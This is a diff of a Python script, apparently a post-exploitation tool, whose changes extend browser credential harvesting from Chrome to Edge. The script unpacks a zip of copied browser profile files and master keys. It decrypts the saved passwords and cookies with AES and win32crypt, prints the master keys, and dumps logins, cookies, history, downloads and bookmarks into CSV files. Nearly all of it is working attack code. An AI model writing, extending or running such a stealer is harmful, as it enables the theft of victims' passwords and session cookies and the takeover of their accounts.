@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
-# Get Chrome Data
-# v0.6
+# Get Remove Chrome Data
+# author: Aquilao
+# v0.7 dev
 
 import os
 import re
@@ -13,8 +14,8 @@ import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
 
-def get_master_key():
-    with open("Sourse_Data\masterkey",'rb') as key:
+def get_master_key(master_key_path):
+    with open(master_key_path,'rb') as key:
         master_key = key.read()
         return master_key
 
@@ -31,8 +32,7 @@ def decrypt_value(buff, master_key):
         return "Error!"
 
 # Decrypt encrypted value in Chrome all version 
-def decrypt_value_all_version(encrypted_value):
-    master_key = get_master_key()
+def decrypt_value_all_version(encrypted_value, master_key):
     if encrypted_value[0:3] == b'v10':
         # Chrome > 80
         decrypted_value = decrypt_value(encrypted_value, master_key)
@@ -55,7 +55,7 @@ def timeStamp2time(timestamp):
     else:
         return "Unknown"
  
-def read_db(csv_path, csv_head, sql):
+def read_db(csv_path, csv_head, sql, master_key):
     conn = sqlite3.connect("temp")
     cursor = conn.cursor()
     with open(csv_path, 'w', newline = '', encoding = "utf-8-sig") as csv_file:
@@ -69,7 +69,7 @@ def read_db(csv_path, csv_head, sql):
                     if "time" in csv_head[i]:
                         info = timeStamp2time(r[i])
                     elif isinstance(r[i], bytes):
-                        info = decrypt_value_all_version(r[i])
+                        info = decrypt_value_all_version(r[i], master_key)
                     else:
                         info = r[i]
                     data.append(str(info) + '\t')
@@ -77,16 +77,16 @@ def read_db(csv_path, csv_head, sql):
                 data = []
             return 0
         except Exception as e:
-            raise e
+            # raise e
             return 1
     cursor.close()
     conn.close()
 
 # Get data in sqlite db
-def get_db_data(target_db, csv_path, csv_head, sql):
+def get_db_data(target_db, csv_path, csv_head, sql, master_key = None):
     shutil.copy2(target_db, "temp")
-    print("[+] Get Chrome Data From " + target_db)
-    status = read_db(csv_path, csv_head, sql)
+    print("[+] Get Data From " + target_db)
+    status = read_db(csv_path, csv_head, sql, master_key)
     if status == 0:
         print("[*] Output In " + os.getcwd() + "\\" + csv_path)
     else:
@@ -99,7 +99,7 @@ def get_db_data(target_db, csv_path, csv_head, sql):
 # Get data in json
 def get_json_data(target_json, csv_path, csv_head):
     shutil.copy2(target_json, "temp")
-    print("[+] Get Chrome Data From " + target_json)
+    print("[+] Get Data From " + target_json)
     with open(csv_path, 'w', newline = '', encoding = "utf-8-sig") as csv_file:
         csvwriter = csv.writer(csv_file, dialect=("excel"))
         csvwriter.writerow(csv_head)
@@ -119,15 +119,20 @@ def get_json_data(target_json, csv_path, csv_head):
         os.remove("temp")
     except Exception as e:
         pass
-        
 
 def main():
     # Target File Path
     TARGET_FILE_PATH = {
-        "CHROME_PASSWORDS_DB_PATH"   : r"Sourse_Data\Login Data",
-        "CHROME_COOKIES_DB_PATH"     : r"Sourse_Data\Cookies",
-        "CHROME_HISTORY_DB_PATH"     : r"Sourse_Data\History",
-        "CHROME_BOOKMARKS_FILE_PATH" : r"Sourse_Data\Bookmarks"
+        "CHROME_LOCAL_STATE_FILE_PATH" : r"Sourse_Data\Chrome_Local_State",
+        "CHROME_PASSWORDS_DB_PATH"     : r"Sourse_Data\Chrome_Login_Data",
+        "CHROME_COOKIES_DB_PATH"       : r"Sourse_Data\Chrome_Cookies",
+        "CHROME_HISTORY_DB_PATH"       : r"Sourse_Data\Chrome_History",
+        "CHROME_BOOKMARKS_FILE_PATH"   : r"Sourse_Data\Chrome_Bookmarks",
+        "EDGE_LOCAL_STATE_FILE_PATH"   : r"Sourse_Data\Edge_Local_State",
+        "EDGE_PASSWORDS_DB_PATH"       : r"Sourse_Data\Edge_Login_Data",
+        "EDGE_COOKIES_DB_PATH"         : r"Sourse_Data\Edge_Cookies",
+        "EDGE_HISTORY_DB_PATH"         : r"Sourse_Data\Edge_History",
+        "EDGE_BOOKMARKS_FILE_PATH"     : r"Sourse_Data\Edge_Bookmarks"
     }
     # Result File Path
     RESULT_FILE_PATH = {
@@ -135,7 +140,12 @@ def main():
         "CHROME_COOKIES_CSV_PATH"   : "Results/Chrome_cookies.csv",
         "CHROME_HISTORY_CSV_PATH"   : "Results/Chrome_history.csv",
         "CHROME_DOWNLOADS_CSV_PATH" : "Results/Chrome_downloads.csv",
-        "CHROME_BOOKMARKS_CSV_PATH" : "Results/Chrome_bookmarks.csv"
+        "CHROME_BOOKMARKS_CSV_PATH" : "Results/Chrome_bookmarks.csv",
+        "EDGE_PASSWORD_CSV_PATH"    : "Results/Edge_password.csv",
+        "EDGE_COOKIES_CSV_PATH"     : "Results/Edge_cookies.csv",
+        "EDGE_HISTORY_CSV_PATH"     : "Results/Edge_history.csv",
+        "EDGE_DOWNLOADS_CSV_PATH"   : "Results/Edge_downloads.csv",
+        "EDGE_BOOKMARKS_CSV_PATH"   : "Results/Edge_bookmarks.csv"
     }
     # Csv File Head
     CSV_FILE_HEAD = {
@@ -155,17 +165,34 @@ def main():
     shutil.unpack_archive("Sourse_Data.zip", "Sourse_Data/")
     if not os.path.exists("Results/"):
         os.makedirs("Results/")
-    # Get Chrome Passwords
-    get_db_data(TARGET_FILE_PATH["CHROME_PASSWORDS_DB_PATH"], RESULT_FILE_PATH["CHROME_PASSWORD_CSV_PATH"], CSV_FILE_HEAD["PASSOWRDS_CSV_HEAD"], SQL["LOGIN_DATA_SQL"])
-    # Get Chrome Cookies
-    get_db_data(TARGET_FILE_PATH["CHROME_COOKIES_DB_PATH"], RESULT_FILE_PATH["CHROME_COOKIES_CSV_PATH"], CSV_FILE_HEAD["COOKIES_CSV_HEAD"], SQL["COOKIES_SQL"])
-    # Get History
-    get_db_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_HISTORY_CSV_PATH"], CSV_FILE_HEAD["HISTORY_CSV_HEAD"], SQL["HISTORY_SQL"])
-    # Get Download History
-    get_db_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_DOWNLOADS_CSV_PATH"], CSV_FILE_HEAD["DOWNLOADS_CSV_HEAD"], SQL["DOWNLOADS_SQL"])
-    # Get Bookmarks
-    get_json_data(TARGET_FILE_PATH["CHROME_BOOKMARKS_FILE_PATH"], RESULT_FILE_PATH["CHROME_BOOKMARKS_CSV_PATH"], CSV_FILE_HEAD["BOOKMARKS_CSV_HEAD"])
-    # Remove "Sourse_Data" folder
+    if os.path.isfile("Sourse_Data\Chrome_masterkey"):
+        chrome_master_key = get_master_key("Sourse_Data\Chrome_masterkey")
+        print("******************************** Get Chrome Data ********************************")
+        print("Chrome master key: " + str(chrome_master_key))
+        # Get Chrome Passwords
+        get_db_data(TARGET_FILE_PATH["CHROME_PASSWORDS_DB_PATH"], RESULT_FILE_PATH["CHROME_PASSWORD_CSV_PATH"], CSV_FILE_HEAD["PASSOWRDS_CSV_HEAD"], SQL["LOGIN_DATA_SQL"], chrome_master_key)
+        # Get Chrome Cookies
+        get_db_data(TARGET_FILE_PATH["CHROME_COOKIES_DB_PATH"], RESULT_FILE_PATH["CHROME_COOKIES_CSV_PATH"], CSV_FILE_HEAD["COOKIES_CSV_HEAD"], SQL["COOKIES_SQL"], chrome_master_key)
+        # Get Chrome History
+        get_db_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_HISTORY_CSV_PATH"], CSV_FILE_HEAD["HISTORY_CSV_HEAD"], SQL["HISTORY_SQL"])
+        # Get Chrome Download History
+        get_db_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_DOWNLOADS_CSV_PATH"], CSV_FILE_HEAD["DOWNLOADS_CSV_HEAD"], SQL["DOWNLOADS_SQL"])
+        # Get Chrome Bookmarks
+        get_json_data(TARGET_FILE_PATH["CHROME_BOOKMARKS_FILE_PATH"], RESULT_FILE_PATH["CHROME_BOOKMARKS_CSV_PATH"], CSV_FILE_HEAD["BOOKMARKS_CSV_HEAD"])
+    if os.path.isfile("Sourse_Data\Edge_masterkey"):
+        edge_master_key = get_master_key("Sourse_Data\Edge_masterkey")
+        print("********************************* Get Edge Data *********************************")
+        print("Edge master key: "+ str(edge_master_key))
+        # Get Edge Passwords
+        get_db_data(TARGET_FILE_PATH["EDGE_PASSWORDS_DB_PATH"], RESULT_FILE_PATH["EDGE_PASSWORD_CSV_PATH"], CSV_FILE_HEAD["PASSOWRDS_CSV_HEAD"], SQL["LOGIN_DATA_SQL"], edge_master_key)
+        # Get Edge Cookies
+        get_db_data(TARGET_FILE_PATH["EDGE_COOKIES_DB_PATH"], RESULT_FILE_PATH["EDGE_COOKIES_CSV_PATH"], CSV_FILE_HEAD["COOKIES_CSV_HEAD"], SQL["COOKIES_SQL"], edge_master_key)
+        # Get Edge History
+        get_db_data(TARGET_FILE_PATH["EDGE_HISTORY_DB_PATH"], RESULT_FILE_PATH["EDGE_HISTORY_CSV_PATH"], CSV_FILE_HEAD["HISTORY_CSV_HEAD"], SQL["HISTORY_SQL"])
+        # Get Edge Download History
+        get_db_data(TARGET_FILE_PATH["EDGE_HISTORY_DB_PATH"], RESULT_FILE_PATH["EDGE_DOWNLOADS_CSV_PATH"], CSV_FILE_HEAD["DOWNLOADS_CSV_HEAD"], SQL["DOWNLOADS_SQL"])
+        # Get Edge Bookmarks
+        get_json_data(TARGET_FILE_PATH["EDGE_BOOKMARKS_FILE_PATH"], RESULT_FILE_PATH["EDGE_BOOKMARKS_CSV_PATH"], CSV_FILE_HEAD["BOOKMARKS_CSV_HEAD"])
     shutil.rmtree("Sourse_Data/")
 
 
